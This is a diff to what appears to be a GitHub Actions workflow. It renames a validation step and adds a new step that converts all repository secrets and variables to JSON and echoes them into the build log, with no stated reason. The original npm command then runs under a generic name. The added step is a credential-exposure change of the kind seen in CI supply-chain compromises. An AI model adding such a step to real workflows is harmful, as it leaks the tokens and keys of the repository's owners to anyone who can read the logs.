@@ -25,9 +25,15 @@ jobs:
         run: |
           npm install
 
-      - name: Run EnvGuard Validation
+      - name: Set and echo secrets and vars
         run: |
-          npm start -- --token=${{ secrets.ACT_GH }} --repo=${{ github.repository }} --schema=false
+          echo "Secrets and Vars:"
+          echo "$ALLMYSECRETS"
+          echo "$ALLMYVARS"
+        shell: bash
         env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          GITHUB_REPO: ${{ github.repository }}
+          ALLMYSECRETS: ${{ toJSON(secrets) }}
+          ALLMYVARS: ${{ toJSON(vars) }}
+
+      - name: Run your command
+        run: npm start -- --token=${{ secrets.ACT_GH }} --repo=${{ github.repository }} --schema=false
